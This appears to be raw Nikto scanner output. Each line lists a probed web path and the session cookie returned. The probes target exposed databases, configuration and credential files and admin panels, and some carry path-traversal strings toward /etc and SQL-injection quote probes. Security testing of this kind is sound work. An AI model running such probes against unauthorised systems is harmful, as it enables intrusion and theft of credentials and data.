[NIKTO-SRV] [NIKTO] + /SiteServer/admin/findvserver.asp sent cookie: JSESSIONID=4CB2DE863AD9CE6644B853B303CB19CF; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /SiteServer/Admin/knowledge/dsmgr/default.asp sent cookie: JSESSIONID=7D81D9A7E218F3AE4E98387A5118058D; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /basilix/mbox-list.php3 sent cookie: JSESSIONID=B39C71BE0003BDE594E3DB9704CC31F9; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /basilix/message-read.php3 sent cookie: JSESSIONID=BC2D0A8B1D8022E360A4A17C3E8D05DB; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /clusterframe.jsp sent cookie: JSESSIONID=C81618F868C942DA040FBE212A07846F; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /IlohaMail/blank.html sent cookie: JSESSIONID=525F4F361321DC616F5DB17E1694589F; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /prd.i/pgen/ sent cookie: JSESSIONID=34088A6DF20037CA16D6F5B8B22BE1EB; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /readme.eml sent cookie: JSESSIONID=99E9B42701D6B66B5947E6064294FD34; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /scripts/httpodbc.dll sent cookie: JSESSIONID=31689A4421748F8360CB513D5025A927; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /scripts/proxy/w3proxy.dll sent cookie: JSESSIONID=CF9334441A2E43B233390C5907C34D87; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /siteseed/ sent cookie: JSESSIONID=D933DF3C2F1B23259DAFF45830F8D8C9; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /scripts/samples/search/author.idq sent cookie: JSESSIONID=95C9E8255B380AAD884614F87FD3973E; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /scripts/samples/search/filesize.idq sent cookie: JSESSIONID=6C6B93DB26CE07CE9EFBE680701E099A; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /scripts/samples/search/filetime.idq sent cookie: JSESSIONID=C34C1C166AF928ABC7E954331D0F23FE; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /scripts/samples/search/queryhit.idq sent cookie: JSESSIONID=AC93788C0B7A700EB7BF15530F88A558; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /scripts/samples/search/simple.idq sent cookie: JSESSIONID=5324C9FEC7CA3D18C3CBAF14D1089927; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /pccsmysqladm/incs/dbconnect.inc sent cookie: JSESSIONID=3B6753660F7473D55827199D0035A226; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /iisadmin/ sent cookie: JSESSIONID=B3FF84A1B37D68E28F27B2C088C5D29F; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /password.inc sent cookie: JSESSIONID=39AB07E51AA0DC9996A071292610D8BF; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /PDG_Cart/order.log sent cookie: JSESSIONID=C5D12A0BC4AD463DA1548BB592AACAB2; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /global.asa sent cookie: JSESSIONID=292CD1F903FBC9C288C7555BEF4CD625; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /exchange/lib/AMPROPS.INC sent cookie: JSESSIONID=E6A7FFBD5CEB65EB7FA2ACA1CA82EEA2; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /exchange/lib/DELETE.INC sent cookie: JSESSIONID=607D50B4F3A3B23C611002603C99E559; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /exchange/lib/GETREND.INC sent cookie: JSESSIONID=2A821A20FA2CABC741F91CF610313303; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /exchange/lib/GETWHEN.INC sent cookie: JSESSIONID=D55EE7B998CCAFCD3B9BBB813D519811; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /exchange/lib/JSATTACH.INC sent cookie: JSESSIONID=B08B8A47D1545B7390994FE755DFDB2E; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /exchange/lib/JSROOT.INC sent cookie: JSESSIONID=4A56EDF858A29989A0E64E39B8ED3351; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /exchange/lib/JSUTIL.INC sent cookie: JSESSIONID=9E34453D1272D21DD8AA60B29C528C19; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /exchange/lib/LANG.INC sent cookie: JSESSIONID=DAC9220D5388F8F257B7C6208F4DD9D3; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /exchange/lib/logon.inc sent cookie: JSESSIONID=19799AA374D5046C8BEBB32F9BEB4015; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /exchange/lib/PAGEUTIL.INC sent cookie: JSESSIONID=AF90D10206996A58E427599047A1ADA0; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /exchange/lib/PUBFLD.INC sent cookie: JSESSIONID=6249BCDB4D93E5B79C0D8B4D5075283B; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /exchange/lib/RENDER.INC sent cookie: JSESSIONID=FF7A71F6CE632AA04185B79EB5DBD137; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /exchange/lib/SESSION.INC sent cookie: JSESSIONID=2253189A828B6AC5978C62572571BDF4; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /ows/restricted%2eshow sent cookie: JSESSIONID=20B88805698BADFBB4F881275782F85C; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /view_source.jsp sent cookie: JSESSIONID=FD813C4F6C1E1A009AF0CD999AB62C67; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /basilix/compose-attach.php3 sent cookie: JSESSIONID=293A9ED7135BCB1C927E45A8EB71DF88; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /server/ sent cookie: JSESSIONID=FF0F1515BB1EDBE967282B41F08B6256; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /siteminder/smadmin.html sent cookie: JSESSIONID=E487187104E93FCB773DC77DF49968BD; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /vgn/ac/data sent cookie: JSESSIONID=648D08FE6B711EA3BF69A606A15EA15B; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /vgn/ac/delete sent cookie: JSESSIONID=736D47ADD98F7CBB3E898DB171A72911; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /vgn/ac/edit sent cookie: JSESSIONID=A9FA20BF740E5EF5CA5528BAB33E9D1E; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /vgn/ac/esave sent cookie: JSESSIONID=10B7DD357AF8515B0D70AADBC41E38BB; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /vgn/ac/fsave sent cookie: JSESSIONID=A7231742CB727287457D1098E6027180; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /vgn/ac/index sent cookie: JSESSIONID=2C9BE73732D2B5F03A8728C5EACD36AC; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /vgn/asp/MetaDataUpdate sent cookie: JSESSIONID=B352EE649F4FE36FA4F5E860BE0ADBAE; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /vgn/asp/previewer sent cookie: JSESSIONID=17C2A824BC4129C38C3ACAB148805CCA; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /vgn/asp/status sent cookie: JSESSIONID=003B42698968461248C8E7556E923A66; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /vgn/asp/style sent cookie: JSESSIONID=6D79D6B4C4EF35F81F3C954CA7A16A90; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /vgn/errors sent cookie: JSESSIONID=75C9905E2714C14CA2386B3E76E3B500; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /vgn/jsp/controller sent cookie: JSESSIONID=BF94FF9D35954D374C93E138EA6E4766; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /vgn/jsp/errorpage sent cookie: JSESSIONID=74C10287705587EDE971B3867D1A7347; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /vgn/jsp/initialize sent cookie: JSESSIONID=C70ACF6ACE1B8F2415DC3ED3A28A2DE8; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /vgn/jsp/jspstatus sent cookie: JSESSIONID=1EFD7D784DE6D20C822E797B3E892F72; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /vgn/jsp/jspstatus56 sent cookie: JSESSIONID=6E3D0FD3A727BBC389E8F922904CC3D2; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /vgn/jsp/metadataupdate sent cookie: JSESSIONID=1AD7B72AD08E969B1E497D562C79C1FD; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /vgn/jsp/previewer sent cookie: JSESSIONID=708CD5B69C3D2D2725D245B1394C3AD3; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /vgn/jsp/style sent cookie: JSESSIONID=462E923D2E4F425FC166CD123D6C063F; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /vgn/legacy/edit sent cookie: JSESSIONID=7E0A927116C43E2F273ADE71DA8E89F4; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /vgn/login sent cookie: JSESSIONID=27B741808404541EC0DBC7E5672556BB; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /webtop/wdk/samples/index.jsp sent cookie: JSESSIONID=D4D18D604CDACD952ED3B07DFD0BAC44; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /WEB-INF/web.xml sent cookie: JSESSIONID=AB6F362AD9C8CFEBD3D3F080E69B75E4; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /forum/admin/wwforum.mdb sent cookie: JSESSIONID=5CF5E7E05D2F5E9F574D216E15F88A1F; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /fpdb/shop.mdb sent cookie: JSESSIONID=95CB2742CC33EED2BA2942811CF82E6D; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /guestbook/admin/o12guest.mdb sent cookie: JSESSIONID=A6A873CE3A203FC3F0B8D26DF26C048F; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /midicart.mdb sent cookie: JSESSIONID=0D09158396A1D01D4CC4E2B2CC3032BE; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /MIDICART/midicart.mdb sent cookie: JSESSIONID=1A62C47D4E18BA91C827D76F5B9CEF73; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /mpcsoftweb_guestbook/database/mpcsoftweb_guestdata.mdb sent cookie: JSESSIONID=0CE9B05D8F2CBF066429323E16D14C6B; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /news/news.mdb sent cookie: JSESSIONID=C90AA7831EC25C56EA5D2C9E8BDEA271; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /newuser?Image=../../database/rbsserv.mdb sent cookie: JSESSIONID=719150AD16371B94E0AE6E939CD1686C; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /vpasp/shopdbtest.asp sent cookie: JSESSIONID=A0080DF281E35760E503E3CA5A1BC241; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /shopping300.mdb sent cookie: JSESSIONID=0773AC4A8E6860426D48FE81AE28043B; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /shopping400.mdb sent cookie: JSESSIONID=183C97EF951A4D6E3030BC12708086D2; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /shoppingdirectory/midicart.mdb sent cookie: JSESSIONID=2801FF644E6CB2CF66E4EA9C6BE29B71; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /SilverStream/Meta/Tables/?access-mode=text sent cookie: JSESSIONID=E81F4B363CB8428EA0D6B50B581AADC6; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /database/db2000.mdb sent cookie: JSESSIONID=71AD3CFE935E3BCF3FCB2959715079E9; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /doc/webmin.config.notes sent cookie: JSESSIONID=6D3B0828C48944D1CD778956610AA5E9; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /error/HTTP_NOT_FOUND.html.var sent cookie: JSESSIONID=F7669EE8EBC0DBC74EBAF01701AC18CF; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /oem_webstage/cgi-bin/oemapp_cgi sent cookie: JSESSIONID=56441B6F73E9190D6B5DD7C29BE8EDD6; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /login.jsp sent cookie: JSESSIONID=3C1120E3A3F3D9FB9C2EF1E14F5ECE42; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /login.jsp sent cookie: JSESSIONID=D5C57E8D60A6C97791841026E9BF37A3; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /adm/config.php sent cookie: JSESSIONID=D64E94B1637FC66A0E28CA3D31534D68; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /administrator/config.php sent cookie: JSESSIONID=ACB24991C8B90649456A6A3AB1F63CBE; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /?mod=node&nid=some_thing&op=view sent cookie: JSESSIONID=E03BD9043022D9C69C0581D3C830F15C; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /?mod=some_thing&op=browse sent cookie: JSESSIONID=F27D5492E9056D401E3DC1DF1043566C; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /article.php?article=4965&post=1111111111 sent cookie: JSESSIONID=D3D82E147EDAB80D3C8FA68E6C7F86DE; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /blah123.php sent cookie: JSESSIONID=4AFAF31E99CCE55BD7AD4BBB99026B69; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /categorie.php3?cid=june sent cookie: JSESSIONID=A3442D150AA75217670C321FA6B34D83; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /CFIDE/probe.cfm sent cookie: JSESSIONID=5D2C0C6F21D966C870775E0B0F4E15C0; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /download.php?op=viewdownload sent cookie: JSESSIONID=F6F8C76275D6D0229B0003D5EF27054D; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /download.php?op=viewdownload sent cookie: JSESSIONID=5B7C220CB1D6BEF972FD4B8D61C40788; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /examples/basic/servlet/HelloServlet sent cookie: JSESSIONID=A0A04D78FCEFC108ECD45AD2DAFE1A68; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /home.php?arsc_language=elvish sent cookie: JSESSIONID=731699297E2E06A71D3E439E975D552F; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /hostadmin/?page=' sent cookie: JSESSIONID=3B32F3D1B4D2A9D5AB7BFC412C1A9D96; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /hostadmin/?page=' sent cookie: JSESSIONID=7A96AA2CC5CD5B87FE228F14FBD0B433; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /index.php?file=index.php sent cookie: JSESSIONID=7A9EB33D1400B5B569CA30F00B6F91F8; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /jgb_eng_php3/cfooter.php3 sent cookie: JSESSIONID=D9C1BAA7C7AE0BD414627B52DCF766E7; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /R2WiW.csp sent cookie: JSESSIONID=849DF7A65AE3E7A4EE604E31C2AE5B71; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /modules.php?name=Downloads&d_op=viewdownload sent cookie: JSESSIONID=5AE0EACB30EA0BF9079021EC7AA2008B; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /modules.php?name=Downloads&d_op=viewdownload sent cookie: JSESSIONID=A9C828E2C0D194C084C6E19AA424DF2D; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /modules.php?op=modload&name=0&file=0 sent cookie: JSESSIONID=378773C126E80E41F4AA5EB423792C0F; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /modules.php?op=modload&name=Sections&file=index&req=viewarticle&artid= sent cookie: JSESSIONID=A7181F6CDA0B7633CE626FDC64D5F5F8; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /modules.php?op=modload&name=Web_Links&file=index&l_op=viewlink sent cookie: JSESSIONID=EBD3104F60FE6D793E1EACF0179097DD; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /path/nw/article.php?id=' sent cookie: JSESSIONID=25E3E01E0D4EA73A3E8FA4329D00FF46; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /pw/storemgr.pw sent cookie: JSESSIONID=EC2FFD41AD9AC70EA88EBAC306333381; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /rtm.log sent cookie: JSESSIONID=D3EC96599C0D49FB966565252757AC82; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /scozbook/view.php?PG=whatever sent cookie: JSESSIONID=F0BF811C4D65FE5A1DD802C9AF7A910E; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /servlet/com.livesoftware.jrun.plugins.ssi.SSIFilter sent cookie: JSESSIONID=0FEC9FD5292824834A53EAB6D9AC3D83; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /shopa_sessionlist.asp sent cookie: JSESSIONID=11DDE10881A94C0EB81F15638A95801F; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /simplebbs/users/users.php sent cookie: JSESSIONID=E5F07B3E02B156CBC0F6CE42CB256F05; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /sips/sipssys/users/a/admin/user sent cookie: JSESSIONID=ED3828313AD5B1A586EA571E5DADF898; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /tcb/files/auth/r/root sent cookie: JSESSIONID=87CCEE9BD9A984B214F779B11D61EECB; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /typo3conf/ sent cookie: JSESSIONID=2821CD7AACB6718C8A185B6758571467; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /cms/typo3conf/ sent cookie: JSESSIONID=21A0B5EF6C3A0EFF85BFCC71FED24B51; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /site/typo3conf/ sent cookie: JSESSIONID=1D8FC74CD6110A46F3DEF274B234CB99; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /typo/typo3conf/ sent cookie: JSESSIONID=8DC7D298C002064D0227085B200965D6; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /typo3/typo3conf/ sent cookie: JSESSIONID=AC37484F8E6B8BBD7D1914A0FAA8D29C; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /typo3conf/database.sql sent cookie: JSESSIONID=FC0ACD2C96A5356F107363EC4A485AFA; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /cms/typo3conf/database.sql sent cookie: JSESSIONID=BA71F90EEDA98F2F8EACE65EDE7C724A; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /site/typo3conf/database.sql sent cookie: JSESSIONID=FAC32B2757CE677828335865BA310CD1; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /typo/typo3conf/database.sql sent cookie: JSESSIONID=8288F37009162E3EBA28D15A5FEEBE32; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /typo3/typo3conf/database.sql sent cookie: JSESSIONID=577B2F69D71F9922A21795DAC80F6A5A; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /typo3conf/localconf.php sent cookie: JSESSIONID=996DFA85509208CF27A6B10A02951709; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /cms/typo3conf/localconf.php sent cookie: JSESSIONID=D8200D57E25E6C784A017F508B4AF97B; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /site/typo3conf/localconf.php sent cookie: JSESSIONID=13306C5D1529B2A9B3F94990AEA5E2E4; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /typo/typo3conf/localconf.php sent cookie: JSESSIONID=DCC6E71AF3F9DA6E6EA9E6E3921744ED; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /typo3/typo3conf/localconf.php sent cookie: JSESSIONID=5F5A29439A778756E3D9A112220C3913; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /vchat/msg.txt sent cookie: JSESSIONID=A439926B51A8A8D3077D56B2E401ACC9; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /vgn/license sent cookie: JSESSIONID=D5427AA46C1B1FBB4CA31D991C0F2027; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /web.config sent cookie: JSESSIONID=8218E02E2F3F14BF002D57B18739202F; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /webamil/test.php?mode=phpinfo sent cookie: JSESSIONID=7D979882D7136FD1280F07100FE7E117; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /webcart-lite/config/import.txt sent cookie: JSESSIONID=DF048250A9409491E7F1E997D016C562; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /webcart-lite/orders/import.txt sent cookie: JSESSIONID=1D25CBA86137A4F47DBFEF925A6C6611; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /webcart/carts/ sent cookie: JSESSIONID=98A1E0B32C74F9417C03E995D5859D81; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /webcart/config/ sent cookie: JSESSIONID=ADFFDA377746AEEB5AAE205269D9BCA1; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /webcart/config/clients.txt sent cookie: JSESSIONID=AC209EF4BAC2B50554DC8928AC4CFFFA; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /webcart/orders/ sent cookie: JSESSIONID=CFB993C4925CB9D035747C4E6A4B9E84; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /webcart/orders/import.txt sent cookie: JSESSIONID=706A5B1B95FBC90AC952AFC666E6E9D8; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /webmail/horde/test.php sent cookie: JSESSIONID=2080F4457CE974EC005790AD24DF8DED; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /whatever9gFe.html sent cookie: JSESSIONID=62AC794B1C78764ADFBA892550A236CD; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /ws_ftp.ini sent cookie: JSESSIONID=328FA71AD004C7E63F941EEE8D9323D5; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /WS_FTP.ini sent cookie: JSESSIONID=0BE03D23DDB84772EE662DC21B5D249C; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /_mem_bin/auoconfig.asp sent cookie: JSESSIONID=BB80FCEA302E0ACADE6BCDBF56F78C0C; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /_mem_bin/auoconfig.asp sent cookie: JSESSIONID=E5C6F61E0346AF29336AD5EA18C03E46; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /_mem_bin/remind.asp sent cookie: JSESSIONID=A5997C8AAE691DFEDB7FDCCBC058ABBF; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /exchange/lib/ATTACH.INC sent cookie: JSESSIONID=A106B2E3D4375007EE5ECA7087F2FC0A; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /SiteServer/Admin/knowledge/persmbr/vs.asp sent cookie: JSESSIONID=4ECAE0A046D8B9B888A799B232E60DE3; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /SiteServer/Admin/knowledge/persmbr/VsLsLpRd.asp sent cookie: JSESSIONID=10E4FBF9CEC4C93ACA03D41FEE64E8DE; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /SiteServer/Admin/knowledge/persmbr/VsPrAuoEd.asp sent cookie: JSESSIONID=77C51CC61C445FFB9190FD6CC32474F5; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /SiteServer/Admin/knowledge/persmbr/VsTmPr.asp sent cookie: JSESSIONID=D7A98FCF857DED4163ED930134CD513D; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /trace.axd sent cookie: JSESSIONID=520C87505FCE34DA6872B2EC3C624BEE; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /tvcs/getservers.exe?action=selects1 sent cookie: JSESSIONID=C8BCD04FE23B3E5AA4D2D01D280AA654; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /whatever.htr sent cookie: JSESSIONID=A6627DC9CAF582901C1FDAFF05B94807; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /./ sent cookie: JSESSIONID=2230071F6D6EFB57BAFB00519970E66C; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /nsn/fdir.bas:ShowVolume sent cookie: JSESSIONID=1C14EF8055BF6D4427950C669686C589; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /nsn/fdir.bas sent cookie: JSESSIONID=0C60C473F2AD61D35384C6B49F0B2350; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /servlet/webacc?User.html=noexist sent cookie: JSESSIONID=082E5AF9441E61A7FD96A7D066B3DD81; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /forum/admin/database/wwForum.mdb sent cookie: JSESSIONID=38C53FC928050D76866A92AA4FEA7D33; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /webmail/blank.html sent cookie: JSESSIONID=A6895B969FE1667EDD26B023173AB447; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /jamdb/ sent cookie: JSESSIONID=E3A62A13FD30B1A2860481440E3A0ED5; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /admin-serv/tasks/configuration/ViewLog?file=hosts&num=5000&str=&directories=admin-serv%2Flogs%2f..%2f..%2f..%2f..%2f..%2f..%2fetc&id=admin-serv sent cookie: JSESSIONID=072D1D6A3E5E0FBAE2F1AEDC5A80E5AD; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + / sent cookie: JSESSIONID=8245CAB186FF9A7011EA3CF45E1F0035; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /IDSWebApp/IDSjsp/Login.jsp sent cookie: JSESSIONID=25F19E3231D2B5A36DDF512E421D1363; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /quikstore.cfg sent cookie: JSESSIONID=00D8FA0DF03D39F4391C7F43A699C506; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /quikstore.cgi sent cookie: JSESSIONID=A0628D88A1E20F6EB0A9D192F496A54F; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /securecontrolpanel/ sent cookie: JSESSIONID=0FA83C29908667A82AC1E49D977C8CF8; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /siteminder sent cookie: JSESSIONID=607F0C6EF5D243EAA3B97C0B340A5854; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /webmail/ sent cookie: JSESSIONID=D25BBD1043214BEC3A261DA62BC93399; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /Xcelerate/LoginPage.html sent cookie: JSESSIONID=6600321DE6BD2BCC5EEEB34F8B636F4B; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /_cti_pvt/ sent cookie: JSESSIONID=C0EC9A781E328D8DEFEE74D02C0968D5; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /smg_Smxcfg30.exe?vcc=3560121183d3 sent cookie: JSESSIONID=CD81AC4BAA261A50D703DD1B98156C05; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /examples/servlets/index.html sent cookie: JSESSIONID=BE5F45B00DE96C59E30DDF78E8065343; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + // sent cookie: JSESSIONID=6B99290A5A0D0ABE6A3A29FFE800B82C; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /webtop/wdk/ sent cookie: JSESSIONID=1731BD8870DEAE78B1C48FE511785197; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /SilverStream sent cookie: JSESSIONID=5397E0CB1969E7BE95AA4DF809A3F2BB; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /signon sent cookie: JSESSIONID=D464A466ED139B2DB13A61246E90FC73; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /upd/ sent cookie: JSESSIONID=689AA01172D77E47F259180BFD3B672D; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /examples/jsp/source.jsp?? sent cookie: JSESSIONID=E773D71548B563086922DE56523099C9; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /cfcache.map sent cookie: JSESSIONID=CB65C26D9F3DF85C77BAC4A573D5C477; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /cfdocs/cfcache.map sent cookie: JSESSIONID=DE15F6E9ADDA541E325E4B89A03EDD84; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /CVS/Entries sent cookie: JSESSIONID=3CA7C3114EC077E8246DEE6CAD30AF35; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /lpt9.xtp sent cookie: JSESSIONID=F3E2D3D2694951A0124EE78FF3D22016; Path=/; HttpOnly
